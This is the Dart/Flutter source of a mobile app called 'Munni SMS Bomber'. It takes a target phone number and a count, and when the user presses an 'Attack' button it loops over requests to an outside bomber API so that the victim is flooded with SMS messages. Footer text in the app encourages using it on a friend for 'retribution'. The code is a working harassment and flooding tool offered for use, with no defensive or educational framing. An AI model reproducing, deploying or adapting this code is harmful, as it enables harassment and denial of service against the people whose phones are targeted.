import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

class HomePage extends StatefulWidget {
  const HomePage({Key? key}) : super(key: key);

  @override
  _HomePageState createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  final TextEditingController mobile = TextEditingController();
  final TextEditingController count = TextEditingController();
  int? smsSent = 0;
  bool? sending = false;

  Future<void> blastBomb(String mobile, String count) async {
    var url = Uri.parse(
        "https://bomberapi.herokuapp.com/bomb?number=" + mobile + "&noOfMsg=1");
    setState(() {
      sending = true;
    });
    for (int i = 0; i < int.parse(count); i++) {
      setState(() {
        smsSent = i + 1;
      });
      var req2 = await http.get(url);
    }
    setState(() {
      sending = false;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF201e37),
      appBar: AppBar(
        backgroundColor: const Color(0xFF3F3351),
        centerTitle: true,
        title: const Text(
          "Munni SMS Bomber",
          style: TextStyle(color: Colors.white),
        ),
      ),
      body: Center(
        child: SingleChildScrollView(
          child: Container(
            height: MediaQuery.of(context).size.height * 0.7,
            width: MediaQuery.of(context).size.width * 0.9,
            decoration: const BoxDecoration(
                borderRadius: BorderRadius.all(Radius.circular(20)),
                gradient: LinearGradient(colors: [
                  Color(0xFF3F3351),
                  Color(0xFF864879),
                ])),
            child: Padding(
              padding: const EdgeInsets.all(8.0),
              child: Column(
                children: [
                  const SizedBox(
                    height: 8,
                  ),
                  Center(
                    child: CircleAvatar(
                      backgroundColor: const Color(0xFF201e37),
                      radius: 40,
                      child: Image.asset('assets/logo/hacker-25899.png'),
                    ),
                  ),
                  Padding(
                      padding: const EdgeInsets.all(20),
                      child: TextField(
                        controller: mobile,
                        style: const TextStyle(
                            color: Color(0xFFE9A6A6),
                            fontWeight: FontWeight.w300),
                        keyboardType: const TextInputType.numberWithOptions(),
                        decoration: const InputDecoration(
                          labelStyle: TextStyle(
                            color: Color(0xFFE9A6A6),
                            fontWeight: FontWeight.w600,
                          ),
                          prefixIcon: Icon(
                            Icons.phone,
                            color: Color(0xFFE9A6A6),
                          ),
                          labelText: "Enter Number",
                          border: UnderlineInputBorder(
                            borderSide: BorderSide(
                              color: Color(0xFFE9A6A6),
                            ),
                          ),
                        ),
                      )),
                  Padding(
                    padding: const EdgeInsets.all(20),
                    child: TextField(
                      controller: count,
                      style: const TextStyle(
                          color: Color(0xFFE9A6A6),
                          fontWeight: FontWeight.w300),
                      keyboardType: const TextInputType.numberWithOptions(),
                      decoration: const InputDecoration(
                        labelStyle: TextStyle(
                          color: Color(0xFFE9A6A6),
                          fontWeight: FontWeight.w600,
                        ),
                        prefixIcon: Icon(
                          Icons.sms,
                          color: Color(0xFFE9A6A6),
                        ),
                        labelText: "SMS Count",
                        border: UnderlineInputBorder(
                          borderSide: BorderSide(
                            color: Color(0xFFE9A6A6),
                          ),
                        ),
                      ),
                    ),
                  ),
                  smsSent == 0
                      ? Container()
                      : Center(
                          child: Text(
                            "$smsSent  SMS Sent",
                            style: const TextStyle(
                                color: Color(0xFFE9A6A6),
                                fontWeight: FontWeight.w700),
                          ),
                        ),
                  Padding(
                    padding: const EdgeInsets.fromLTRB(50, 25, 50, 0),
                    child: sending == true
                        ? const SizedBox(
                            height: 50,
                            width: 50,
                            child: CircularProgressIndicator(),
                          )
                        : InkWell(
                            onTap: () {
                              blastBomb(mobile.text, count.text);
                            },
                            child: Container(
                              height: 50,
                              decoration: BoxDecoration(
                                gradient: const LinearGradient(
                                  colors: [
                                    Color(0xFF864879),
                                    Color(0xFFE9A6A6),
                                  ],
                                  begin: Alignment.topLeft,
                                  end: Alignment.bottomRight,
                                ),
                                borderRadius: BorderRadius.circular(20),
                                boxShadow: const [
                                  BoxShadow(
                                    color: Colors.black12,
                                    offset: Offset(5, 5),
                                    blurRadius: 10,
                                  )
                                ],
                              ),
                              child: const Center(
                                child: Text(
                                  'Attack',
                                  style: TextStyle(
                                    color: Colors.white,
                                    fontSize: 30,
                                    fontWeight: FontWeight.w500,
                                  ),
                                ),
                              ),
                            ),
                          ),
                  ),
                  Padding(
                    padding: const EdgeInsets.all(20.0),
                    child: Center(
                        child: Column(
                      children: const [
                        Text(
                          "Proudly designed and coded by Rocky Karmakar",
                          style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                        SizedBox(
                          height: 4,
                        ),
                        Text(
                          "Only use on a close friend if you want to exact retribution.",
                          style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.w400,
                          ),
                        ),
                        SizedBox(
                          height: 4,
                        ),
                        Text(
                          "Motivated by Munni",
                          style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                      ],
                    )),
                  )
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}
